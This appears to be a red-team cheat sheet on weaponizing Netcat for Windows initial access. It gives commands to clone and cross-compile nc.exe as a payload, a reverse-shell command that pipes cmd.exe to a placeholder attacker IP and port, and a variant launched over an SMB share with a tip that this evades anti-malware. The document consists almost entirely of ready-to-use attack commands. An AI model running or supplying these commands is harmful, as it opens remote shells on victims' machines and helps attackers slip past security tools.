---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - netcat
  - windows
---
# Netcat

## 01 - Compile

Clone the repository and compile the payload.

```
$ git clone https://github.com/int0x33/nc.exe.git && cd nc.exe/ && \
rm *.exe && sed -i -e s/\#CC=x86_64-pc-mingw32-gcc// \
-e s/\CC=i686-pc-mingw32-gcc/CC=x86_64-w64-mingw32-gcc/ Makefile && \
make 2>/dev/null
```

It's ready to be deployed as an payload.

```
$ file nc.exe 
nc.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
```

## 02 - Execute Payload

```
C:\> nc.exe -v <attacker_IP> <attacker_PORT> -e cmd.exe
```

Dropper payloads over UNC path.

> [!TIP]
> Try to execute the payload over SMB to bypass Anti-Malware.

```
C:\> \\<attacker_IP>\<share_name>\nc.exe -v <attacker_IP> <attacker_PORT> -e cmd.exe
```

---
## References

### Source Repositories

- [int0x33: `nc.exe`](https://github.com/int0x33/nc.exe)